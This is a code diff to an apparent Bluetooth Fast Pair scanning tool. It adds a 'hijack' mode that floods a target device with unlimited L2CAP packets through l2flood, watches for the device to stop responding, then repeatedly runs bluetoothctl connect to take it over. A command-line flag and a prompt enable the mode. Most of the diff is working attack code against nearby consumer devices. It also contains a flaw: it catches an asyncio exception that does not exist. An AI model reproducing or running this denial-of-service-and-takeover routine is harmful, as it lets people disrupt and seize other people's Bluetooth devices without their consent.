@@ -145,9 +145,81 @@ async def scan_fastpair(duration: int = 10) -> List[Device]:
     return found
 
 
-async def run_aggressive_test(results: List[dict], output_file: str = None) -> None:
+def attempt_hijack_after_flood(addr: str, hci: Optional[str] = None, threads: Optional[int] = None, skip_ping: bool = False) -> bool:
+    """
+    Attempt to hijack a device by connecting via bluetoothctl.
+    If skip_ping is True, don't run the normal ping (already detected no response).
+    Returns True if hijack succeeded, False otherwise.
+    """
+    if not skip_ping:
+        info("Checking for no response via normal ping...")
+        cmd = ["sudo", "l2flood"]
+        if hci:
+            cmd.extend(["-i", hci])
+        if threads:
+            cmd.extend(["-n", str(threads)])
+        cmd.extend(["-c", "-1", "-t", "2", addr])
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
+        )
+        pattern = re.compile(r'no response from ' + re.escape(addr) + r': id \d+')
+        start = time.time()
+        found = False
+        while True:
+            line = proc.stdout.readline()
+            if not line:
+                break
+            print(f"  {DIM}{line.rstrip()}{RESET}")
+            if pattern.search(line):
+                found = True
+                break
+            if time.time() - start > 30:  # timeout 30s
+                break
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait()
+
+        if not found:
+            warn("No no‑response detected; hijack aborted.")
+            return False
+
+    info("Device is not responding – attempting hijack via bluetoothctl...")
+    while True:
+        try:
+            res = subprocess.run(
+                ["sudo", "bluetoothctl", "connect", addr],
+                capture_output=True,
+                text=True,
+                timeout=None
+            )
+            if res.returncode == 0:
+                ok(f"Hijack successful! Connected to {CYAN}{addr}{RESET}")
+                return True
+            else:
+                if res.stderr.strip():
+                    err(f"Hijack attempt failed: {res.stderr.strip()}")
+                else:
+                    warn(f"Hijack attempt failed (return code {res.returncode}). Retrying...")
+        except KeyboardInterrupt:
+            print()
+            info("Hijack interrupted by user. Exiting...")
+            sys.exit(0)
+        except Exception as e:
+            err(f"Unexpected error during hijack: {e}")
+
+
+async def run_aggressive_test(results: List[dict], output_file: str = None, hijack_after: bool = False) -> None:
     """
     Prompt for and optionally run aggressive L2CAP testing on extracted addresses.
+    If hijack_after is True, automatically detect when the device stops responding
+    and attempt to hijack it.
     """
     print(); div("═")
     print(f"  {YELLOW}⚠️  LEGAL WARNING — READ BEFORE PROCEEDING{RESET}")
@@ -224,45 +296,102 @@ async def run_aggressive_test(results: List[dict], output_file: str = None) -> N
 
         print(); div(); info(f"Target {CYAN}{i}/{len(results)}{RESET}: {WHITE}{device_name}{RESET} ({CYAN}{permanent_addr}{RESET}")
 
-        cmd = ["sudo", "l2flood", "-R"]
+        # Build aggressive flood command
+        cmd_aggressive = ["sudo", "l2flood", "-R"]
         if hci:
-            cmd.extend(["-i", hci])
+            cmd_aggressive.extend(["-i", hci])
         if threads:
-            cmd.extend(["-n", str(threads)])
-        cmd.extend(["-c", "-1"])  # Infinite packets
-        cmd.append(permanent_addr)
+            cmd_aggressive.extend(["-n", str(threads)])
+        cmd_aggressive.extend(["-c", "-1"])  # Infinite packets
+        cmd_aggressive.append(permanent_addr)
+
+        # If hijack_after is enabled, we'll run a normal ping in parallel to detect no-response
+        detection_task = None
+        aggressive_proc = None
+        hijack_triggered = False
 
         try:
-            proc = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
+            # Start aggressive flood
+            aggressive_proc = await asyncio.create_subprocess_exec(
+                *cmd_aggressive,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
             )
 
+            # If hijack_after, start detection process (normal l2flood without -R)
+            if hijack_after:
+                cmd_detect = ["sudo", "l2flood"]
+                if hci:
+                    cmd_detect.extend(["-i", hci])
+                if threads:
+                    cmd_detect.extend(["-n", str(threads)])
+                cmd_detect.extend(["-c", "-1", "-t", "2", permanent_addr])
+                detect_proc = await asyncio.create_subprocess_exec(
+                    *cmd_detect,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.STDOUT,
+                )
+
+                # Create a task to read detection output
+                async def detect_no_response():
+                    nonlocal hijack_triggered
+                    pattern = re.compile(r'no response from ' + re.escape(permanent_addr) + r': id \d+')
+                    while True:
+                        line = await detect_proc.stdout.readline()
+                        if not line:
+                            break
+                        decoded = line.decode().rstrip()
+                        print(f"  {DIM}{decoded}{RESET}")
+                        if pattern.search(decoded):
+                            hijack_triggered = True
+                            # Send SIGINT to aggressive flood (graceful exit)
+                            if aggressive_proc.returncode is None:
+                                aggressive_proc.send_signal(signal.SIGINT)
+                            break
+                    # Cleanup detection process
+                    detect_proc.terminate()
+                    await detect_proc.wait()
+
+                detection_task = asyncio.create_task(detect_no_response())
+
+            # Wait for aggressive flood to finish or be terminated
             try:
                 if duration is None:
-                    proc.wait()
-                    proc.wait(timeout=duration)
-            except subprocess.TimeoutExpired:
+                    # Wait forever until interrupted or detection triggers
+                    await aggressive_proc.wait()
+                else:
+                    # Wait for duration
+                    await asyncio.wait_for(aggressive_proc.wait(), timeout=duration)
+            except asyncio.TimeoutExpired:
+                # Duration limit reached
                 info("Duration limit reached, stopping flood...")
-                proc.send_signal(2)  # SIGINT
-                try:
-                    proc.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    proc.kill()
-            except KeyboardInterrupt:
-                proc.send_signal(2)  # SIGINT
-                try:
-                    proc.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    proc.kill()
-                info("\nFlood stopped. Exiting.")
-                sys.exit(0)
+                aggressive_proc.send_signal(signal.SIGINT)
+                await aggressive_proc.wait()
+            except asyncio.CancelledError:
+                # This might happen if detection triggered and we cancelled
+                pass
 
-            stdout, stderr = proc.communicate()
-            if stdout:
-                print(f"  {DIM}{stdout.strip()[:100]}{RESET}")
+            # If detection triggered, we already killed the flood; now attempt hijack
+            if hijack_triggered:
+                info("No response detected – proceeding to hijack...")
+                # Wait a moment for the aggressive flood to fully exit
+                await aggressive_proc.wait()
+                # Attempt hijack (skip ping because we already detected)
+                attempt_hijack_after_flood(permanent_addr, hci, threads, skip_ping=True)
+            else:
+                # Flood finished normally; if hijack_after, we can still attempt hijack but we'll run ping check
+                if hijack_after:
+                    info("Flood completed – checking if device is still responsive for hijack...")
+                    attempt_hijack_after_flood(permanent_addr, hci, threads, skip_ping=False)
+
+            # Cleanup detection task if still running
+            if detection_task and not detection_task.done():
+                detection_task.cancel()
+                try:
+                    await detection_task
+                except asyncio.CancelledError:
+                    pass
+
             ok(f"Flood completed for {device_name}")
 
         except FileNotFoundError:
@@ -270,6 +399,17 @@ async def run_aggressive_test(results: List[dict], output_file: str = None) -> N
             return
         except Exception as e:
             err(f"Error: {e}")
+        finally:
+            # Ensure processes are cleaned up
+            if aggressive_proc and aggressive_proc.returncode is None:
+                aggressive_proc.terminate()
+                await aggressive_proc.wait()
+            if detection_task and not detection_task.done():
+                detection_task.cancel()
+                try:
+                    await detection_task
+                except:
+                    pass
 
         if i < len(results):
             await asyncio.sleep(2)
@@ -460,6 +600,11 @@ Examples:
         action="store_true",
         help="Skip prompts and run aggressive test immediately (requires prior authorization)"
     )
+    parser.add_argument(
+        "--hijack", "-H",
+        action="store_true",
+        help="Attempt hijack after aggressive flood (requires --aggressive or interactive yes)"
+    )
     args = parser.parse_args()
 
     if os.geteuid() != 0:
@@ -542,7 +687,7 @@ Examples:
 
     if results and len(results) > 0:
         if args.aggressive:
-            await run_aggressive_test(results, args.output)
+            await run_aggressive_test(results, args.output, hijack_after=args.hijack)
         else:
             print(); div("═")
             print(f"  {YELLOW}⚠️  AGGRESSIVE L2CAP TESTING (OPTIONAL){RESET}")
@@ -556,8 +701,12 @@ Examples:
             ).strip().lower()
 
             if aggressive_prompt == "yes":
+                hijack_prompt = input(
+                    "Attempt hijack after flood? (yes/no): "
+                ).strip().lower()
+                hijack_after = hijack_prompt == "yes"
                 print(); info("Starting aggressive test mode...")
-                await run_aggressive_test(results, args.output)
+                await run_aggressive_test(results, args.output, hijack_after=hijack_after)
 
 
 if __name__ == "__main__":
